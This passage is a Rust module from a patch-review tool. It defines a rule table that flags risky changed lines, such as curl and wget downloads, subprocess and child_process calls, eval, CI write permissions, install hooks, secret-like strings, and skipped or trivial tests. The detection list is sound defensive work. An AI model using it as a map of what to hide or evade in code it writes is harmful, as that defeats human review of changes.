// DDF integration: code-evidence risk signals with hunk addresses (plan 2026-10-30, Feature A).
// Design/status: docs/PLAN_AGENT_EVIDENCE_AND_OBSERVABILITY.md#feature-a-code-evidence-risk-signals
// Module vault note (bidirectional): obsidian://open?vault=deep-diff-forge.vault&file=Implementation%2FModules%2Fcrates--deep-diff-forge-graph--src--evidence
//! Code evidence: what the changed lines of a patch do, found in the patch alone and pointed at
//! by hunk address and line, so an agent can check each claim instead of trusting it.
//!
//! Every rule lives in one table, `RULES`: one signal, the side of the change it reads, the view it reads
//! (code with comments and strings blanked, or the raw line), where it applies, and what it
//! matches. Evidence is lexical ([`EVIDENCE_BASIS`]): it finds tokens, it never proves a change
//! is safe, and a construct split across lines or built at run time can hide from it.

use crate::lexical::{Language, ScanState, code_view, has_token, is_boundary_blocker, is_ident};
use deep_diff_forge_core::{HunkId, PatchHunk, PatchLine, PatchLineKind, ReviewFile};
use deep_diff_forge_syntax::{ConstructKind, FragmentScan, scan_fragment};

/// The basis of the first rung: what every item carried before [`Basis`] existed, and what an
/// item found by a token on one line still carries.
pub const EVIDENCE_BASIS: &str = Basis::Lexical.label();

/// The most evidence items a file reports; the score still counts every signal found.
pub const MAX_EVIDENCE_PER_FILE: usize = 32;

/// What a changed line does that a reviewer should see first.
#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord, Hash)]
pub enum EvidenceSignal {
    /// Rust `unsafe` added.
    UnsafeAdded,
    /// A process is started (`Command::new`, `subprocess`, `child_process`, `exec.Command`).
    ProcessSpawn,
    /// A network call or download (`reqwest`, `requests`, `fetch(`, `curl`, `wget`).
    NetworkFetch,
    /// Code built and run from data (`eval(`, `exec(`, `new Function(`, shell `eval`).
    DynamicEval,
    /// A CI workflow gains a privilege (`pull_request_target`, write permissions, inherited
    /// secrets).
    CiPrivilege,
    /// Code that runs at build or install time (`build.rs`, `setup.py`, npm install hooks).
    BuildHook,
    /// Text shaped like a credential (a private key header, a cloud or forge token).
    SecretLike,
    /// A lint, type or coverage check is switched off (`#[allow(`, `# noqa`, `@ts-ignore`).
    CheckSuppressed,
    /// A test is removed.
    TestRemoved,
    /// A test is switched off where it stands (`#[ignore]`, `pytest.mark.skip`, `it.skip(`,
    /// `t.Skip(`): it still reads as a test and checks nothing.
    TestSkipped,
    /// An assertion that cannot fail (`assert!(true)`, `assert True`, `expect(true).toBe(true)`).
    TrivialAssert,
    /// A placeholder where code should be (`todo!(`, `unimplemented!(`,
    /// `raise NotImplementedError`).
    StubAdded,
    /// An error is caught and dropped: an `except` whose body is `pass`, an empty `catch` block,
    /// an empty `if err != nil` block, `_ = err`, an `Err(_)` arm that does nothing.
    ErrorSwallowed,
    /// A call that panics on failure is added (Rust `unwrap` and `expect`, called as a method
    /// or by a path, or passed as a function). It is reported in test code too: nothing in a
    /// patch proves that code is test code, and an item the hunk shows under a test attribute
    /// says so ([`Evidence::test_likely`]).
    PanicPathAdded,
    /// A Rust hunk holds words the parser checks (`unwrap`, `assert`, `todo`, `ignore`, …) and
    /// the parser did not read it: the hunk is over a budget, or the review's budget was spent
    /// before it. What the token rules found stands, and what only the parser finds (a
    /// construct over several lines) is not known. It says "not checked", never "bad".
    SyntaxUnchecked,
}

impl EvidenceSignal {
    /// Every signal, in the order scores and output list them.
    pub const ALL: [Self; 15] = [
        Self::UnsafeAdded,
        Self::ProcessSpawn,
        Self::NetworkFetch,
        Self::DynamicEval,
        Self::CiPrivilege,
        Self::BuildHook,
        Self::SecretLike,
        Self::CheckSuppressed,
        Self::TestRemoved,
        Self::TestSkipped,
        Self::TrivialAssert,
        Self::StubAdded,
        Self::ErrorSwallowed,
        Self::PanicPathAdded,
        Self::SyntaxUnchecked,
    ];

    /// Stable snake-case label for machine output.
    #[must_use]
    pub const fn label(self) -> &'static str {
        match self {
            Self::UnsafeAdded => "unsafe_added",
            Self::ProcessSpawn => "process_spawn",
            Self::NetworkFetch => "network_fetch",
            Self::DynamicEval => "dynamic_eval",
            Self::CiPrivilege => "ci_privilege",
            Self::BuildHook => "build_hook",
            Self::SecretLike => "secret_like",
            Self::CheckSuppressed => "check_suppressed",
            Self::TestRemoved => "test_removed",
            Self::TestSkipped => "test_skipped",
            Self::TrivialAssert => "trivial_assert",
            Self::StubAdded => "stub_added",
            Self::ErrorSwallowed => "error_swallowed",
            Self::PanicPathAdded => "panic_path_added",
            Self::SyntaxUnchecked => "syntax_unchecked",
        }
    }

    /// The score a file gains once for carrying this signal (the one weight table).
    #[must_use]
    pub const fn weight(self) -> u32 {
        match self {
            Self::SecretLike => 5,
            Self::UnsafeAdded | Self::ProcessSpawn | Self::DynamicEval | Self::CiPrivilege => 4,
            Self::NetworkFetch
            | Self::BuildHook
            | Self::TestRemoved
            | Self::TestSkipped
            | Self::TrivialAssert
            | Self::StubAdded
            | Self::ErrorSwallowed
            | Self::PanicPathAdded => 3,
            Self::CheckSuppressed => 2,
            Self::SyntaxUnchecked => 1,
        }
    }

    /// Whether the signal is about a test losing its force. Such a signal lives in test files, so
    /// a test path does not halve its weight as it does every other signal's.
    #[must_use]
    pub const fn weakens_a_test(self) -> bool {
        matches!(
            self,
            Self::TestRemoved | Self::TestSkipped | Self::TrivialAssert
        )
    }
}

/// Which side of the change a line is on.
#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord, Hash)]
pub enum Side {
    /// An added line, numbered on the new side.
    New,
    /// A removed line, numbered on the old side.
    Old,
}

impl Side {
    /// Stable label for machine output.
    #[must_use]
    pub const fn label(self) -> &'static str {
        match self {
            Self::New => "new",
            Self::Old => "old",
        }
    }
}

/// How an evidence item was found: the rung of the evidence ladder that confirmed it. A higher
/// rung sees more than a lower one, and an item states the highest that found it.
#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord, Hash)]
pub enum Basis {
    /// One changed line, comments and strings blanked, matched by token.
    Lexical,
    /// A changed line read with its neighbours on the same side of the hunk.
    Hunk,
    /// The side of the hunk parsed as a fragment of its language: the construct itself, read
    /// by the parser, with no error above it.
    SyntaxFragment,
}

impl Basis {
    /// Stable label for machine output.
    #[must_use]
    pub const fn label(self) -> &'static str {
        match self {
            Self::Lexical => "lexical",
            Self::Hunk => "hunk",
            Self::SyntaxFragment => "syntax_fragment",
        }
    }
}

/// One piece of evidence: a signal at a line of a hunk.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Evidence {
    pub signal: EvidenceSignal,
    /// The rung that found it ([`Basis`]).
    pub basis: Basis,
    /// The hunk, by id (for anchors) and by address (for machines).
    pub hunk: HunkId,
    pub address: String,
    pub side: Side,
    /// The line number on `side`.
    pub line: u32,
    /// The hunk shows a test attribute around this panic path (`#[test]`, a path ending in
    /// `::test`, `#[rstest]`, `#[cfg(test)]`). It is a hint for a reader and never proof: an
    /// import can bind those names to anything, and a hunk can sit under an open comment. So
    /// the item stands, the score does not change, and what a judge sees is the same; a reader
    /// may weigh the item by it. Only ever true on [`EvidenceSignal::PanicPathAdded`].
    ///
    /// Nothing withdraws a panic path any more. Until 2026-11-14 the parser withdrew one that
    /// it "proved" to be inside a top-level `#[cfg(test)]` item of a file the patch creates
    /// whole. Five rounds of review each found another text that the grammar and the compiler
    /// read differently, every one compiled and run to a panic in production code (second
    /// independent review, IR2-H-1 to IR2-H-4), and that class has no end. The decision: the
    /// parser never removes evidence. The cost is that a panic path in a test module is
    /// reported, with this mark.
    pub test_likely: bool,
}

/// What part of a line a rule reads.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum View {
    /// Comments and string contents blanked.
    Code,
    /// The line as written (a suppression lives in a comment, a secret in a string).
    Raw,
}

/// Where a rule applies.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum Scope {
    /// Files of these languages.
    Languages(&'static [Language]),
    /// Any file, any language or none.
    Any,
    /// CI workflow definitions (`.github/workflows/*.yml`, `.gitlab-ci.yml`).
    CiWorkflow,
    /// Build and install scripts (`build.rs`, `setup.py`).
    BuildScript,
    /// `package.json`.
    PackageJson,
}

/// What a rule looks for.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum Match {
    /// Any of these tokens. A trailing `*` makes a token a prefix (no boundary after it).
    Tokens(&'static [&'static str]),
    /// Any line with code on it.
    AnyCode,
    /// A credential-shaped string ([`looks_like_secret`]).
    Secret,
    /// A JS import of one of these modules ([`imports_module`]).
    Imports(&'static [&'static str]),
    /// An error handler with nothing in it ([`empty_handler`]). It reads the line and the next
    /// line on the same side of the hunk, so what it finds has [`Basis::Hunk`].
    EmptyHandler,
    /// A call of a method with one of these names: `.name(` in the code view.
    Method(&'static [&'static str]),
    /// One of `heads` (a whole word, with no [`is_boundary_blocker`] before it) followed by one
    /// of `tails`, with any whitespace before the tail and between its bytes: `assert ! ( true )`
    /// is `assert` and `!(true)`. The parser reads such spellings too; these keep them found
    /// where the parser does not read (review V3 round 3, VD3R3-H-2).
    Spaced {
        heads: &'static [&'static str],
        tails: &'static [&'static str],
    },
    /// Rust `assert!(true)`, `assert!(true, …)`, `assert_eq!(true, true)`, `assert_eq!(true,
    /// true, …)` and their `debug_` forms, whatever the spacing ([`trivial_assert_rust`]).
    TrivialAssertRust,
    /// Rust `#[ignore]`, `#[ignore = "…"]` and `#[cfg_attr(…, ignore)]`, whatever the spacing,
    /// and through a `cfg_attr` that a `cfg_attr` applies ([`ignore_rust`]).
    IgnoreRust,
}

impl Match {
    /// The rung a match of this kind stands on.
    const fn basis(self) -> Basis {
        match self {
            Self::EmptyHandler => Basis::Hunk,
            Self::Tokens(_)
            | Self::AnyCode
            | Self::Secret
            | Self::Imports(_)
            | Self::Method(_)
            | Self::Spaced { .. }
            | Self::TrivialAssertRust
            | Self::IgnoreRust => Basis::Lexical,
        }
    }
}

#[derive(Debug, Clone, Copy)]
struct Rule {
    signal: EvidenceSignal,
    side: Side,
    view: View,
    scope: Scope,
    matches: Match,
}

const RUST: &[Language] = &[Language::Rust];
const PYTHON: &[Language] = &[Language::Python];
const JS: &[Language] = &[Language::JavaScript];
const GO: &[Language] = &[Language::Go];
const SHELL: &[Language] = &[Language::Shell];
const SHELL_OR_YAML: &[Language] = &[Language::Shell, Language::Yaml];

const fn rule(
    signal: EvidenceSignal,
    side: Side,
    view: View,
    scope: Scope,
    matches: Match,
) -> Rule {
    Rule {
        signal,
        side,
        view,
        scope,
        matches,
    }
}

use EvidenceSignal as S;

/// Every evidence rule. A test builds one positive case per token from this table, so a token
/// cannot be added without a case that finds it.
const RULES: &[Rule] = &[
    rule(
        S::UnsafeAdded,
        Side::New,
        View::Code,
        Scope::Languages(RUST),
        Match::Tokens(&["unsafe"]),
    ),
    rule(
        S::ProcessSpawn,
        Side::New,
        View::Code,
        Scope::Languages(RUST),
        Match::Tokens(&["Command::new", "process::Command"]),
    ),
    rule(
        S::ProcessSpawn,
        Side::New,
        View::Code,
        Scope::Languages(PYTHON),
        Match::Tokens(&[
            "subprocess.",
            "os.system(",
            "os.popen(",
            "os.exec*",
            "os.spawn*",
            "pty.spawn(",
        ]),
    ),
    rule(
        S::ProcessSpawn,
        Side::New,
        View::Code,
        Scope::Languages(JS),
        Match::Tokens(&["child_process", "execSync(", "spawnSync(", "execFileSync("]),
    ),
    // The module is always named in a string, which the code view blanks, so the specifier is
    // read from the raw line wherever the code view shows an import.
    rule(
        S::ProcessSpawn,
        Side::New,
        View::Code,
        Scope::Languages(JS),
        Match::Imports(&["child_process"]),
    ),
    rule(
        S::ProcessSpawn,
        Side::New,
        View::Code,
        Scope::Languages(GO),
        Match::Tokens(&["exec.Command(", "exec.CommandContext(", "syscall.Exec("]),
    ),
    rule(
        S::NetworkFetch,
        Side::New,
        View::Code,
        Scope::Languages(RUST),
        Match::Tokens(&[
            "reqwest::",
            "ureq::",
            "TcpStream::connect",
            "UdpSocket::bind",
        ]),
    ),
    rule(
        S::NetworkFetch,
        Side::New,
        View::Code,
        Scope::Languages(PYTHON),
        Match::Tokens(&[
            "requests.",
            "urllib.request",
            "http.client",
            "socket.socket(",
        ]),
    ),
    rule(
        S::NetworkFetch,
        Side::New,
        View::Code,
        Scope::Languages(JS),
        Match::Tokens(&[
            "fetch(",
            "XMLHttpRequest",
            "http.request(",
            "https.request(",
        ]),
    ),
    rule(
        S::NetworkFetch,
        Side::New,
        View::Code,
        Scope::Languages(GO),
        Match::Tokens(&["http.Get(", "http.Post(", "http.NewRequest(", "net.Dial("]),
    ),
    rule(
        S::NetworkFetch,
        Side::New,
        View::Code,
        Scope::Languages(SHELL_OR_YAML),
        Match::Tokens(&["curl", "wget"]),
    ),
    rule(
        S::DynamicEval,
        Side::New,
        View::Code,
        Scope::Languages(PYTHON),
        Match::Tokens(&["eval(", "exec(", "compile(", "__import__("]),
    ),
    rule(
        S::DynamicEval,
        Side::New,
        View::Code,
        Scope::Languages(JS),
        Match::Tokens(&["eval(", "new Function("]),
    ),
    rule(
        S::DynamicEval,
        Side::New,
        View::Code,
        Scope::Languages(SHELL),
        Match::Tokens(&["eval"]),
    ),
    rule(
        S::CiPrivilege,
        Side::New,
        View::Code,
        Scope::CiWorkflow,
        Match::Tokens(&[
            "pull_request_target",
            "write-all",
            "contents: write",
            "id-token: write",
            "packages: write",
            "actions: write",
            "secrets: inherit",
        ]),
    ),
    rule(
        S::BuildHook,
        Side::New,
        View::Code,
        Scope::BuildScript,
        Match::AnyCode,
    ),
    rule(
        S::BuildHook,
        Side::New,
        View::Raw,
        Scope::PackageJson,
        Match::Tokens(&[
            "\"preinstall\"",
            "\"install\"",
            "\"postinstall\"",
            "\"prepare\"",
        ]),
    ),
    rule(
        S::SecretLike,
        Side::New,
        View::Raw,
        Scope::Any,
        Match::Secret,
    ),
    rule(
        S::CheckSuppressed,
        Side::New,
        View::Raw,
        Scope::Languages(RUST),
        // whatever the spacing: `# [allow(` and `#! [allow(` are the same attributes
        Match::Spaced {
            heads: &["#"],
            tails: &["[allow(", "![allow("],
        },
    ),
    rule(
        S::CheckSuppressed,
        Side::New,
        View::Raw,
        Scope::Languages(PYTHON),
        Match::Tokens(&[
            "# noqa",
            "#noqa",
            "# type: ignore",
            "# nosec",
            "# pragma: no cover",
        ]),
    ),
    rule(
        S::CheckSuppressed,
        Side::New,
        View::Raw,
        Scope::Languages(JS),
        Match::Tokens(&[
            "eslint-disable",
            "@ts-ignore",
            "@ts-nocheck",
            "@ts-expect-error",
        ]),
    ),
    rule(
        S::CheckSuppressed,
        Side::New,
        View::Raw,
        Scope::Languages(GO),
        Match::Tokens(&["//nolint", "// nolint", "#nosec"]),
    ),
    // Whatever the spacing, and so with raw identifiers too, whose prefixes the code view
    // blanks: `#[r#test]` reads `#[  test]` there, and the exact token `#[test]` did not match
    // it (review V3 round 9, VD3R9-M-1).
    rule(
        S::TestRemoved,
        Side::Old,
        View::Code,
        Scope::Languages(RUST),
        Match::Spaced {
            heads: &["#"],
            tails: &["[test]", "[tokio::test]", "[rstest]"],
        },
    ),
    rule(
        S::TestRemoved,
        Side::Old,
        View::Code,
        Scope::Languages(PYTHON),
        Match::Tokens(&["def test*", "async def test*"]),
    ),
    rule(
        S::TestRemoved,
        Side::Old,
        View::Code,
        Scope::Languages(JS),
        Match::Tokens(&["it(", "test(", "describe("]),
    ),
    rule(
        S::TestRemoved,
        Side::Old,
        View::Code,
        Scope::Languages(GO),
        Match::Tokens(&["func Test*"]),
    ),
    // An attribute or a decorator is code, so a skip named in a comment or a string is not one.
    rule(
        S::TestSkipped,
        Side::New,
        View::Code,
        Scope::Languages(RUST),
        Match::IgnoreRust,
    ),
    rule(
        S::TestSkipped,
        Side::New,
        View::Code,
        Scope::Languages(PYTHON),
        Match::Tokens(&[
            "pytest.mark.skip*",
            "pytest.mark.xfail",
            "pytest.skip(",
            "unittest.skip*",
            "self.skipTest(",
        ]),
    ),
    rule(
        S::TestSkipped,
        Side::New,
        View::Code,
        Scope::Languages(JS),
        Match::Tokens(&[
            "it.skip(",
            "test.skip(",
            "describe.skip(",
            "it.skipIf(",
            "test.skipIf(",
            "describe.skipIf(",
            "it.todo(",
            "test.todo(",
            "xit(",
            "xtest(",
            "xdescribe(",
        ]),
    ),
    rule(
        S::TestSkipped,
        Side::New,
        View::Code,
        Scope::Languages(GO),
        Match::Tokens(&["t.Skip(", "t.Skipf(", "t.SkipNow("]),
    ),
    rule(
        S::TrivialAssert,
        Side::New,
        View::Code,
        Scope::Languages(RUST),
        Match::TrivialAssertRust,
    ),
    rule(
        S::TrivialAssert,
        Side::New,
        View::Code,
        Scope::Languages(PYTHON),
        Match::Tokens(&["assert True", "self.assertTrue(True)"]),
    ),
    rule(
        S::TrivialAssert,
        Side::New,
        View::Code,
        Scope::Languages(JS),
        Match::Tokens(&[
            "expect(true).toBe(true)",
            "expect(true).toEqual(true)",
            "assert(true)",
            "assert.ok(true)",
        ]),
    ),
    // A placeholder named in a message string is blanked with the string, so only the forms
    // that are code are read: JS and Go have none.
    rule(
        S::StubAdded,
        Side::New,
        View::Code,
        Scope::Languages(RUST),
        Match::Spaced {
            heads: &["todo", "unimplemented"],
            tails: &["!("],
        },
    ),
    rule(
        S::StubAdded,
        Side::New,
        View::Code,
        Scope::Languages(PYTHON),
        Match::Tokens(&["raise NotImplementedError"]),
    ),
    // An arm that names no error and does nothing is on one line: a token finds it.
    rule(
        S::ErrorSwallowed,
        Side::New,
        View::Code,
        Scope::Languages(RUST),
        Match::Tokens(&["Err(_) => {}", "Err(_) => ()"]),
    ),
    rule(
        S::ErrorSwallowed,
        Side::New,
        View::Code,
        Scope::Languages(GO),
        Match::Tokens(&["_ = err"]),
    ),
    // Called as a method or by a path, or the standard one named as a function to pass
    // ([`calls_method`]). Nothing tells a test from other code here: a test path halves the
    // weight, and an item the hunk shows under a test attribute is marked `test_likely`, and
    // stands.
    rule(
        S::PanicPathAdded,
        Side::New,
        View::Code,
        Scope::Languages(RUST),
        Match::Method(&["unwrap", "expect"]),
    ),
    // A handler and its empty body are often two lines: these read the next line too.
    rule(
        S::ErrorSwallowed,
        Side::New,
        View::Code,
        Scope::Languages(PYTHON),
        Match::EmptyHandler,
    ),
    rule(
        S::ErrorSwallowed,
        Side::New,
        View::Code,
        Scope::Languages(JS),
        Match::EmptyHandler,
    ),
    rule(
        S::ErrorSwallowed,
        Side::New,
        View::Code,
        Scope::Languages(GO),
        Match::EmptyHandler,
    ),
];

/// What a file is, for rule scopes.
struct FileKind {
    language: Option<Language>,
    ci_workflow: bool,
    build_script: bool,
    package_json: bool,
}

impl FileKind {
    fn of(file: &ReviewFile) -> Self {
        let path = file.path.as_str();
        let name = path.rsplit('/').next().unwrap_or(path);
        // A shebang is read from the first line of a new side that starts at line 1.
        let first_line = file
            .patch_twin
            .hunks
            .first()
            .filter(|h| h.new_start == Some(1))
            .and_then(|h| h.lines.iter().find(|l| l.kind != PatchLineKind::Removed))
            .map(|l| l.text.as_str());
        // One extension table: the lexical layer's.
        let yaml = Language::of(path, None) == Some(Language::Yaml);
        let generated = crate::risk::is_generated_or_vendored(path);
        Self {
            language: Language::of(path, first_line),
            ci_workflow: ((path.starts_with(".github/workflows/")
                || path.contains("/.github/workflows/"))
                && yaml)
                || name == ".gitlab-ci.yml",
            // These two are path-scoped (the file's role, not its tokens), so like every path
            // signal they do not apply under a generated or vendored path. Token rules do.
            build_script: (name == "build.rs" || name == "setup.py") && !generated,
            package_json: name == "package.json" && !generated,
        }
    }

    fn admits(&self, scope: Scope) -> bool {
        match scope {
            Scope::Any => true,
            Scope::Languages(languages) => self.language.is_some_and(|l| languages.contains(&l)),
            Scope::CiWorkflow => self.ci_workflow,
            Scope::BuildScript => self.build_script,
            Scope::PackageJson => self.package_json,
        }
    }
}

/// The most bytes of Rust hunks the parser reads in one review, both sides of a hunk counted.
/// Parsing costs time per byte, a review can hold tens of megabytes of hunks that are each
/// under the fragment budget, and a consumer gives the whole ranking a fixed time (review V3
/// round 2, VD3R2-H-2: a 61 MiB patch of a thousand 64 KB expressions ran past 15 s). Hunks
/// beyond the budget keep what the token rules found.
///
/// This is the limit for text whose cost grows in step with its length. Ordinary Rust parses
/// at about 0.3 microseconds a byte; the slowest such text found, all error recovery
/// (`a?b:a?b:…`), at about 14, and 2 MiB of it ranked in 27 seconds (independent review,
/// IR-H-3). It was 256 KiB until 2026-11-14; text whose cost grows with the square of its
/// length is bounded by [`REVIEW_SQUARE_BUDGET`], and both limits hold at once.
pub const REVIEW_FRAGMENT_BUDGET: usize = 128 * 1024;

/// The most the parser's hunks of one review may add up to when each parsed hunk is charged
/// the square of its bytes: the square of its new side, plus the square of its old side (of
/// at most one fragment of it, as for [`REVIEW_FRAGMENT_BUDGET`]). The value is the square of
/// 22 KiB, about 5.07e8.
///
/// A byte budget alone does not bound the parser's time. For some text tree-sitter's cost
/// grows with the square of the length: `// todo`, a newline and `#!#!#!…` costs about
/// 3.76e-9 s times the square of its bytes for one parse (4 KiB 0.07 s, 8 KiB 0.28 s, 16 KiB
/// 1.0 s, 32 KiB 3.9 s, 64 KiB 14.8 s), so sixteen hunks of 16 KB, inside the 256 KiB the
/// review budget then was, ranked in 15 s, and one hunk of 64 KiB in as long (second
/// independent review, IR2-H-5). No clock cuts a parse (the same patch must give the same
/// answer on a loaded machine; IR-M-1), so the bound has to be a count, and the count that
/// follows a cost on the square is the sum of the squares.
///
/// Measured on this repository's last 300 commits: 97% of the hunks that hold a word the
/// parser reads are under 8 KiB and 99.5% under 16 KiB, and the 99th percentile commit totals
/// 56 KB of them. So a real review, which is many small hunks, spends little of this budget
/// (a hundred hunks of 1 KiB spend a fifth of it, and the byte budget ends a review of such
/// hunks first), while one hunk of 22 KiB spends it all and a larger one is never parsed.
/// The worst known cost of a whole budget:
/// about 1.9 s for the quadratic text and 1.8 s for the slowest linear text (14 microseconds
/// a byte over [`REVIEW_FRAGMENT_BUDGET`]), for each wrapping of a hunk that is tried. The two
/// budgets are spent apart, so one review can spend both: a patch built for it (seven hunks
/// of 8 KB of the quadratic text, then ninety-four of 790 bytes of the linear one) ranked in
/// 2.8 s.
///
/// A view costs what the rank costs: `--outline` and `--hunks` scan each file once under the
/// same plan and take a hunk's labels from that scan (that patch's outline took 2.8 s; when
/// the views scanned each hunk a second time for its labels it took between 5.2 and 5.8 s).
pub const REVIEW_SQUARE_BUDGET: u64 = (22 * 1024) * (22 * 1024);

/// Which hunks of a review the parser may read: hunks of Rust files, in the review's own order,
/// each one that still fits both budgets, [`REVIEW_FRAGMENT_BUDGET`] for its bytes and
/// [`REVIEW_SQUARE_BUDGET`] for their squares. A hunk that does not fit either is not parsed
/// and costs nothing; a smaller one after it may still fit. It is made from the whole review
/// before any file is scored, so the answer for a hunk does not depend on which files were
/// scored first or on how many workers score them.
#[derive(Debug, Clone, Default, PartialEq, Eq)]
pub struct FragmentPlan {
    allowed: Vec<Vec<Reading>>,
}

/// What a [`FragmentPlan`] allows the parser for one hunk.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Default)]
pub enum Reading {
    /// Not parsed: the token rules' answer stands.
    #[default]
    Off,
    /// Parsed. What the parser reads adds evidence or raises its basis, and removes none: a
    /// hunk proves nothing about the rest of its file, and neither does a file the patch
    /// creates whole (there was a third reading for that file until 2026-11-14; see
    /// [`Evidence::test_likely`]).
    Hunk,
}

impl FragmentPlan {
    /// The plan for `files`, the whole review in its order.
    #[must_use]
    pub fn of(files: &[ReviewFile]) -> Self {
        let mut spent = FragmentCost::default();
        let mut allowed = Vec::with_capacity(files.len());
        for file in files {
            let rust = FileKind::of(file).language == Some(Language::Rust);
            let mut hunks = Vec::with_capacity(file.patch_twin.hunks.len());
            for hunk in &file.patch_twin.hunks {
                let after = rust
                    .then(|| fragment_cost(hunk))
                    .flatten()
                    .map(|cost| FragmentCost {
                        bytes: spent.bytes.saturating_add(cost.bytes),
                        squares: spent.squares.saturating_add(cost.squares),
                    })
                    .filter(|after| {
                        after.bytes <= REVIEW_FRAGMENT_BUDGET
                            && after.squares <= REVIEW_SQUARE_BUDGET
                    });
                if let Some(after) = after {
                    spent = after;
                }
                hunks.push(if after.is_some() {
                    Reading::Hunk
                } else {
                    Reading::Off
                });
            }
            allowed.push(hunks);
        }
        Self { allowed }
    }

    /// For each hunk of the file at `index`, whether the parser may read it. Empty for an index
    /// the plan does not have: nothing is parsed.
    #[must_use]
    pub fn file(&self, index: usize) -> &[Reading] {
        self.allowed.get(index).map_or(&[], Vec::as_slice)
    }

    /// What the parser may do with hunk `hunk` of file `file`.
    #[must_use]
    pub fn reading(&self, file: usize, hunk: usize) -> Reading {
        self.file(file).get(hunk).copied().unwrap_or_default()
    }

    /// Whether the parser may read hunk `hunk` of file `file`.
    #[must_use]
    pub fn allows(&self, file: usize, hunk: usize) -> bool {
        self.reading(file, hunk) != Reading::Off
    }
}

/// The words of the constructs the parser reads in a Rust hunk. A hunk with none of them on its
/// new side has nothing for the parser to find, costs nothing and is not parsed.
const PARSER_WORDS: [&str; 6] = [
    "unwrap",
    "expect",
    "assert",
    "todo",
    "unimplemented",
    "ignore",
];

/// Where a hunk that the parser should read, and did not, says so: `None` when the parser has
/// nothing to find in it. That is a hunk with no added line, or with none of the
/// [`PARSER_WORDS`] on any line of its new side. Unchanged lines count, since a construct can
/// open on one and reach an added line (`assert!(` unchanged, `true` added under it). The raw
/// text is read, comments and strings included: it errs toward checking. The place is the first
/// added line that holds a word, or else the first added line, by its index in `hunk.lines`.
fn first_parser_word(hunk: &PatchHunk) -> Option<usize> {
    let holds_word = |line: &PatchLine| PARSER_WORDS.iter().any(|word| line.text.contains(word));
    let added = |line: &PatchLine| line.kind == PatchLineKind::Added;
    let first_added = hunk.lines.iter().position(added)?;
    hunk.lines
        .iter()
        .position(|line| added(line) && holds_word(line))
        .or_else(|| {
            hunk.lines
                .iter()
                .any(|line| line.kind == PatchLineKind::Context && holds_word(line))
                .then_some(first_added)
        })
}

/// What parsing a hunk costs a review: against [`REVIEW_FRAGMENT_BUDGET`] its bytes, and
/// against [`REVIEW_SQUARE_BUDGET`] the squares of the bytes of each side.
#[derive(Debug, Clone, Copy, Default, PartialEq, Eq)]
struct FragmentCost {
    bytes: usize,
    squares: u64,
}

/// What parsing `hunk` costs: the bytes of its new side and, up to one fragment, of its old
/// side (the old side is parsed only when a construct that starts on an unchanged line
/// reaches an added one, and the plan is made before that is known). `None` when it is not
/// parsed at all: its new side holds no word the parser reads ([`first_parser_word`]), or is
/// over the fragment budget.
fn fragment_cost(hunk: &PatchHunk) -> Option<FragmentCost> {
    first_parser_word(hunk)?;
    let (mut new, mut old, mut added) = (0usize, 0usize, false);
    for line in &hunk.lines {
        let bytes = line.text.len() + 1;
        match line.kind {
            PatchLineKind::Context => {
                new += bytes;
                old += bytes;
            }
            PatchLineKind::Added => {
                new += bytes;
                added = true;
            }
            PatchLineKind::Removed => old += bytes,
        }
    }
    let old = old.min(deep_diff_forge_syntax::FRAGMENT_BYTE_BUDGET);
    let square = |bytes: usize| {
        let bytes = u64::try_from(bytes).unwrap_or(u64::MAX);
        bytes.saturating_mul(bytes)
    };
    (added && new <= deep_diff_forge_syntax::FRAGMENT_BYTE_BUDGET).then(|| FragmentCost {
        bytes: new + old,
        squares: square(new).saturating_add(square(old)),
    })
}

/// Every piece of evidence in `file`, in hunk order, then line order, then rule order, with no
/// duplicates and no cap (callers cap what they print with [`MAX_EVIDENCE_PER_FILE`]). The file
/// is planned on its own; a caller that holds the whole review uses [`file_evidence_in`].
#[must_use]
pub fn file_evidence(file: &ReviewFile) -> Vec<Evidence> {
    file_evidence_in(file, FragmentPlan::of(std::slice::from_ref(file)).file(0))
}

/// [`file_evidence`] under a review's [`FragmentPlan`]: `parse` says, for each hunk of `file`,
/// whether the parser may read it (a hunk it does not name is not parsed).
#[must_use]
pub fn file_evidence_in(file: &ReviewFile, parse: &[Reading]) -> Vec<Evidence> {
    let kind = FileKind::of(file);
    let rules: Vec<&Rule> = RULES.iter().filter(|r| kind.admits(r.scope)).collect();
    let mut out: Vec<Evidence> = Vec::new();
    if rules.is_empty() {
        return out;
    }
    for (at, hunk) in file.patch_twin.hunks.iter().enumerate() {
        let parse = parse.get(at).copied().unwrap_or_default();
        let mut address = None;
        // `hunk_matches` yields each (side, signal, line) once and items from different hunks
        // differ in `hunk`, so there is nothing to deduplicate: a scan of `out` per item made a
        // patch of 160k matching lines take 4.8 s.
        let found = hunk_matches(hunk, kind.language, &rules, parse);
        for (side, signal, line, basis) in found.items {
            let address = address
                .get_or_insert_with(|| hunk.address(&file.path))
                .clone();
            out.push(Evidence {
                signal,
                basis,
                hunk: hunk.id,
                address,
                side,
                line,
                test_likely: signal == S::PanicPathAdded
                    && side == Side::New
                    && found.test_likely.binary_search(&line).is_ok(),
            });
        }
    }
    out
}

/// The distinct signals in one hunk of `file`, in [`EvidenceSignal::ALL`] order: the labels the
/// outline and hunk views show. The same scan as [`file_evidence`], so a view never disagrees
/// with the rank. The file is planned on its own; a caller that holds the whole review uses
/// [`hunk_signals_in`].
#[must_use]
pub fn hunk_signals(file: &ReviewFile, hunk: &PatchHunk) -> Vec<EvidenceSignal> {
    let plan = FragmentPlan::of(std::slice::from_ref(file));
    let at = file.patch_twin.hunks.iter().position(|h| h.id == hunk.id);
    hunk_signals_in(
        file,
        hunk,
        at.map_or(Reading::Off, |at| plan.reading(0, at)),
    )
}

/// [`hunk_signals`] under a review's [`FragmentPlan`]: `parse` is the plan's answer for `hunk`.
#[must_use]
pub fn hunk_signals_in(file: &ReviewFile, hunk: &PatchHunk, parse: Reading) -> Vec<EvidenceSignal> {
    let kind = FileKind::of(file);
    let rules: Vec<&Rule> = RULES.iter().filter(|r| kind.admits(r.scope)).collect();
    let found = hunk_matches(hunk, kind.language, &rules, parse).items;
    EvidenceSignal::ALL
        .into_iter()
